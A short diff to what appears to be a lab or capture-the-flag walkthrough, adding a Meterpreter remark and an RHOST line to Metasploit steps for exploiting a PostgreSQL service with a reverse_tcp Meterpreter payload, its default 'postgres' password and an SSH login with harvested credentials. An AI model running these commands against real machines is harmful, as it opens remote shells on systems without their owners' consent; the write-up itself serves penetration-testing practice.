@@ -124,7 +124,7 @@ We should now have credentials for users on the remote machine. We can verify ou
 
 ```ssh username@<TargetIP>```
 
-Extra: Meterpreter
+Extra: Meterpreter - For Stealth, Flexibility, and Reliablity. ```help``` command
 
 Postgress exploit
 
@@ -135,6 +135,8 @@ Postgress exploit
 ```set payload linux/x86/meterpreter/reverse_tcp```
 
 ```set LHOST <Local IP>```
+
+```set RHOST <Target IP>```
 
 ```set PASSWORD postgres```
 
